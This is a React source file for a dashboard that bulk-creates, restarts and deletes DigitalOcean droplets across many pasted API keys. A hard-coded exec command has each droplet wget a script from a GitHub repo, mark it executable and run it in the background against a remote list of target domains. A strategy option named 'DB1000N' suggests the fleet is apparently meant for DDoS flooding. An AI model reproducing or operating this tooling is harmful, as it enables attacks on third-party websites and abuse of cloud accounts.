import { useState, useEffect, useRef, useCallback } from 'react'
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  Title,
  Tooltip,
  Legend,
} from 'chart.js';
import moment from 'moment';
import { Line } from 'react-chartjs-2';

import api from './api/api'

import Style from './App.style'

ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  Title,
  Tooltip,
  Legend
);

function App() {
  const $ta = useRef();
  const $login = useRef();
  const $password = useRef();
  const $exec = useRef();
  const [state, setState] = useState({
    perf: {}
  })

  const [apiKeys, setApiKeys] = useState([])
  const [creds, setCreds] = useState({
    login: '',
    password: ''
  })
  const [loadingState, setLoadingState] = useState({})
  const [strategy, setStrategy] = useState('custom')
  const [domainsURL, setDomainsURL] = useState("https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/list.txt")

  const setLoading = (apiKey, loading) => {
    setLoadingState(prev => ({
      ...prev,
      [apiKey]: loading
    }))
  }

  const getData = useCallback(async (apiKey) => {
    setLoading(apiKey, true)
    const droplets = await api.getAllDroplets({
      apiKey
    })

    setState(prev => ({
      ...prev,
      [apiKey]: droplets
    }))
    setLoading(apiKey, false)
  },[])

  const getAllData = useCallback(async (keys) => {
    for (let apiKey of keys) {
      getData(apiKey)
    }
  }, [getData])

  useEffect(() => {
    const storedKeys = localStorage.getItem('keys')
    const storedCreds = localStorage.getItem('creds')

    if (storedCreds && creds.password === '' && creds.password === '') {
      const c = JSON.parse(storedCreds)

      setCreds(c)
    }

    if (storedKeys && apiKeys.length === 0) {
      const p = JSON.parse(storedKeys)

      setApiKeys(p)

      getAllData(p)
    }
  }, [apiKeys.length, creds.password, getAllData])

  const getPerf = apiKey => async () => {
    const dropletsIds = state[apiKey].map(d => d.id)
    setLoading(apiKey, true)

    const perf = await api.getPerformanceByApiKey({
      apiKey,
      dropletsIds
    })

    setState(prev => ({
      ...prev,
      perf: {
        ...prev.perf,
        [apiKey]: perf
      }
    }))
    setLoading(apiKey, false)
  }

  const options = {
    responsive: true,
    maintainAspectRatio: true,
    animation: {
      duration: 0,
    },
    hover: {
      animationDuration: 0,
    },
    responsiveAnimationDuration: 0,
    plugins: {
      legend: {
        display: false,
        position: 'top',
      },
      title: {
        display: false,
        text: 'Chart.js Line Chart',
      },
    },
  };

  const renderChart = (perfData) => {
    if (!perfData) {
      return null
    }

    const labels = perfData.map(p => moment(p[0] * 1000).format('HH:mm'))

    const data = {
      labels,
      datasets: [
        {
          label: 'Dataset 1',
          data: perfData.map(p => Number(p[1])),
          borderColor: 'rgb(255, 99, 132)',
          backgroundColor: 'rgba(255, 99, 132, 0.5)',
        }
      ],
    };

    return <Line options={options} data={data} />
  }

  const updatePerf = (id, index, apiKey) => async () => {
    setLoading(apiKey, true)

    const perf = await api.getPerformanceById({
      id,
      apiKey
    })

    setState(prev => {
      let np

      if (prev.perf[apiKey]) {
        np = [...prev.perf[apiKey]]
      } else {
        np = []
      }

      np[index] = perf

      return ({
        ...prev,
        perf: {
          ...prev.perf,
          [apiKey]: np
        }
      })
    })
    setLoading(apiKey, false)
  }

  const hardRestart = (id, name, apiKey) => async () => {
    if (!window.confirm('are you sure')) {
      return null
    }
    setLoading(apiKey, true)

    await api.restart({
      id,
      name,
      apiKey,
      creds,
      exec: getExecCommand()
    })

    await getData(apiKey)
    setLoading(apiKey, false)
  }

  const deleteDroplet = (id, apiKey) => async () => {
    if (!window.confirm('are you sure')) {
      return null
    }
    setLoading(apiKey, true)

    await api.deleteDroplet({
      id,
      apiKey
    })

    setState(prev => ({
      ...prev,
      perf: {
        ...prev.perf,
        [apiKey]: prev.perf[apiKey].filter(d => d.id !== id)
      }
    }))

    await getData(apiKey)
    setLoading(apiKey, false)

  }

  const deleteAllDroplet = apiKey => async () => {
    if (!window.confirm('are you sure')) {
      return null
    }
    setLoading(apiKey, true)

    await api.deleteAllDroplets({apiKey})

    await getData(apiKey)
    setState(prev => ({
      ...prev,
      perf: {
        ...prev.perf,
        [apiKey]: []
      }
    }))
    setLoading(apiKey, false)
  }

  const processApiKeys = () => {
    setApiKeys([])
    window.localStorage.removeItem('keys')

    const keys = $ta.current.value.split('\n').map(k => k.trim()).filter(k => k !== undefined && k !== '' && k !== null)
    const login = $login.current.value.trim()
    const password = $password.current.value.trim()

    if (keys.length === 0) {
      alert('invalid keys')
      return;
    }

    if (!login || !password) {
      alert('invalid credentials')
      return;
    }

    window.localStorage.setItem('keys', JSON.stringify(keys))
    window.localStorage.setItem('creds', JSON.stringify({ login, password }))

    let perf = {}

    keys.forEach(k => perf[k] = [])

    setApiKeys(keys)

    setCreds({
      login,
      password
    })
    setState({
      ...state,
      perf
    })

    getAllData(keys)
  }

  const getExecCommand = () => {
    let exec = $exec.current.value.trim();

    exec = exec.replace('{password}', creds.password);
    exec = exec.replace('{login}', creds.login);

    return exec.split('\n')
  }

  const createDroplet = apiKey => async () => {
    if (!window.confirm('are you sure')) {
      return null
    }

    const name = prompt("enter name:")

    setLoading(apiKey, true)

    await api.createDroplet({
      name,
      creds,
      exec: getExecCommand(),
      apiKey,
    })

    await getData(apiKey)
    setLoading(apiKey, false)

  }

  const createDroplets = apiKey => async () => {
    if (!window.confirm('are you sure')) {
      return null
    }

    const amount = prompt("amount:")
    const prefix = prompt("prefix:")

    const names = Array(Number(amount)).fill(1).map((c, x) => `${prefix}${x + 1}`)
    setLoading(apiKey, true)


    await api.createDroplets({
      names,
      creds,
      exec: getExecCommand(),
      apiKey
    })

    await getData(apiKey)
    setLoading(apiKey, false)
  }

  const fillDroplets = apiKey => async () => {
    if (!window.confirm('are you sure')) {
      return null
    }

    const prefix = prompt("prefix:")

    setLoading(apiKey, true)


    await api.fillDroplets({
      prefix,
      creds,
      exec: getExecCommand(),
      apiKey
    })

    await getData(apiKey)
    setLoading(apiKey, false)
  }

  return (
    <div className='container-fluid mt-3'>
      <>
        <div className="row">
          <div className="col-9">
            <label className="form-label">Api keys (newline):</label>
            <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"} placeholder={"apikey1\napikey2\napikey3"}/>
          </div>
          <div className="col-3">
            <label className="form-label">Login:</label>
            <input type="text" ref={$login} className="form-control mb-1" defaultValue={creds.login} />
            <label className="form-label">Password:</label>
            <input type="text" ref={$password} className="form-control mb-1" defaultValue={creds.password} />
          </div>
        </div>
        <div className="row my-2">
          <div className="col">
            <h4>Strategy</h4>
            <div className="form-check form-check-inline">
              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onChange={() => setStrategy('custom')} checked={strategy === 'custom'} />
              <label className="form-check-label" htmlFor="flexRadioDefault1">
                Custom
              </label>
            </div>
            <div className="form-check form-check-inline">
              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('db1000n')} disabled />
              <label className="form-check-label" htmlFor="flexRadioDefault2">
                DB1000N
              </label>
            </div>
          </div>
        </div>
        {strategy === 'custom' && <div className="row my-2">
          <div className="col">
            <h5>Domains file URL</h5>
            <input type="text" className="form-control mb-1" value={domainsURL} onChange={e => setDomainsURL(e.target.value)} />
          </div>
        </div>}
        <div className="row">
          <div className="col">
            <label className="form-label">Exec command:</label>
            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => { }} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/' + (strategy === 'custom' ? 'custom' : 'db1000n') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f ' + domainsURL + ' >/dev/null 2>&1 &'} />
          </div>
        </div>
        <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
        <hr />
        <div className="col">
          <div className="row">
            {apiKeys.length > 0 && <>
              <h5>Total instances: {apiKeys.map(k => state[k]).flat().length}</h5>
            </>}
          </div>
        </div>
        <hr className='my-4' />
        {apiKeys.length > 0 && <>
          {apiKeys.map(apiKey => (
            <div className="card mb-2" key={apiKey}>
              {loadingState[apiKey] && <Style.ProgressContainer>
                <i className="bi bi-arrow-clockwise"></i>
              </Style.ProgressContainer>}
              <div className="card-body">
                <h5 className="card-title">{apiKey}</h5>
                <div className="btn-group mb-3">
                  <button className="btn btn-outline-primary" onClick={getPerf(apiKey)}><i className="bi bi-graph-up"></i></button>
                  <button className="btn btn-outline-primary" onClick={() => getData(apiKey)}><i className="bi bi-arrow-clockwise"></i></button>
                </div>
                <div className="btn-group mb-3 mx-3">
                  <button className="btn btn-outline-primary" onClick={createDroplet(apiKey)}><i className="bi bi-plus-lg"></i></button>
                  <button className="btn btn-outline-primary" onClick={createDroplets(apiKey)}>Create droplets</button>
                  <button className="btn btn-outline-primary" onClick={fillDroplets(apiKey)}>Fill remaining</button>
                </div>
                <div className="btn-group mb-3">
                  <button className="btn btn-outline-danger" onClick={deleteAllDroplet(apiKey)}><i className="bi bi-trash"></i></button>
                </div>
                {state[apiKey] && state[apiKey].map((droplet, index) => {

                  return (
                    <div className="row mb-1" key={droplet.id}>
                      <div className="col-2">
                          <Style.Name>{droplet.name}</Style.Name>
                      </div>
                      <div className="col-3">
                      <Style.ID>#{droplet.id}</Style.ID>
                      </div>
                      <div className="col-3">
                        <div className="btn-group">
                          <button className="btn btn-sm btn-outline-primary" onClick={updatePerf(droplet.id, index, apiKey)}><i className="bi bi-graph-up"></i></button>
                          <button className="btn btn-sm btn-outline-primary" onClick={hardRestart(droplet.id, droplet.name, apiKey)}><i className="bi bi-arrow-clockwise"></i></button>
                          <button className="btn btn-sm btn-outline-primary" onClick={deleteDroplet(droplet.id, apiKey)}><i className="bi bi-trash"></i></button>
                        </div>
                      </div>
                      <div className="col-4">
                        <Style.ChartContainer>
                          {renderChart(state?.perf?.[apiKey]?.[index]?.data?.result[0]?.values)}
                        </Style.ChartContainer>
                      </div>
                    </div>
                  )
                })}
              </div>
            </div>
          ))}
        </>}
      </>
    </div>
  );
}

export default App;
